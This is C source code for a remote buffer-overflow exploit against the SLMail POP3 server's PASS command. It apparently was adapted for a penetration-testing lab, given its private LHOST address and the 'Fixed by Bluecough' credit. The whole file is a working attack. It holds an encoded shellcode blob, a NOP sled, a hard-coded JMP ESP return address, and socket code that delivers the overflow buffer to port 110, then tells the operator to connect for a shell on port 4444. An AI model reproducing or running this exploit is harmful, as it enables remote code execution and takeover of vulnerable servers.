/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
- Fixed by Bluecough
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 443
// unsigned
// LHOST=10.11.0.79 --- You should change this shellcode
char shellcode[] =
"\xda\xc5\xbd\x31\x4a\x78\x34\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x6e\x17\x83\xee\xfc\x03\x5f\x59\x9a\xc1\x63\xb5\xd8"
"\x2a\x9b\x46\xbd\xa3\x7e\x77\xfd\xd0\x0b\x28\xcd\x93\x59\xc5"
"\xa6\xf6\x49\x5e\xca\xde\x7e\xd7\x61\x39\xb1\xe8\xda\x79\xd0"
"\x6a\x21\xae\x32\x52\xea\xa3\x33\x93\x17\x49\x61\x4c\x53\xfc"
"\x95\xf9\x29\x3d\x1e\xb1\xbc\x45\xc3\x02\xbe\x64\x52\x18\x99"
"\xa6\x55\xcd\x91\xee\x4d\x12\x9f\xb9\xe6\xe0\x6b\x38\x2e\x39"
"\x93\x97\x0f\xf5\x66\xe9\x48\x32\x99\x9c\xa0\x40\x24\xa7\x77"
"\x3a\xf2\x22\x63\x9c\x71\x94\x4f\x1c\x55\x43\x04\x12\x12\x07"
"\x42\x37\xa5\xc4\xf9\x43\x2e\xeb\x2d\xc2\x74\xc8\xe9\x8e\x2f"
"\x71\xa8\x6a\x81\x8e\xaa\xd4\x7e\x2b\xa1\xf9\x6b\x46\xe8\x95"
"\x58\x6b\x12\x66\xf7\xfc\x61\x54\x58\x57\xed\xd4\x11\x71\xea"
"\x1b\x08\xc5\x64\xe2\xb3\x36\xad\x21\xe7\x66\xc5\x80\x88\xec"
"\x15\x2c\x5d\xa2\x45\x82\x0e\x03\x35\x62\xff\xeb\x5f\x6d\x20"
"\x0b\x60\xa7\x49\xa6\x9b\x20\x7c\x3c\xa3\xff\xe8\x40\xa3\xee"
"\xb4\xcd\x45\x7a\x55\x98\xde\x13\xcc\x81\x94\x82\x11\x1c\xd1"
"\x85\x9a\x93\x26\x4b\x6b\xd9\x34\x3c\x9b\x94\x66\xeb\xa4\x02"
"\x0e\x77\x36\xc9\xce\xfe\x2b\x46\x99\x57\x9d\x9f\x4f\x4a\x84"
"\x09\x6d\x97\x50\x71\x35\x4c\xa1\x7c\xb4\x01\x9d\x5a\xa6\xdf"
"\x1e\xe7\x92\x8f\x48\xb1\x4c\x76\x23\x73\x26\x20\x98\xdd\xae"
"\xb5\xd2\xdd\xa8\xb9\x3e\xa8\x54\x0b\x97\xed\x6b\xa4\x7f\xfa"
"\x14\xd8\x1f\x05\xcf\x58\x2f\x4c\x4d\xc8\xb8\x09\x04\x48\xa5"
"\xa9\xf3\x8f\xd0\x29\xf1\x6f\x27\x31\x70\x75\x63\xf5\x69\x07"
"\xfc\x90\x8d\xb4\xfd\xb0";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3501];
      char buf[3501];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90"
		       "\x90\x90";
      memset(buf, 0x00, 3500);
      memset(evil, 0x00, 3500);
      memset(evil, 0x43, 3450);
//      *(long*)&evil[2606] = 0x8f354a5f; //JMP ESP XP 7CB41020 FFE4 JMP ESP
      *(long*)&evil[2606] = 0x5f4a358f; //JMP ESP 5F4A358F FFE4 JMP ESP - Windows is Big Endian?
      ptr = &evil[2610];
//      ptr = ptr + &evil[2606]; // 2608
//      ptr = ptr + 652; // 2608
      memcpy(ptr, &nopsled, 16);
      ptr = &evil[2626];
      memcpy(ptr, &shellcode, 351);
//      *(long*)&evil[2606] = 0x8f354a5f; //JMP ESP XP 7CB41020 FFE4 JMP ESP



      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
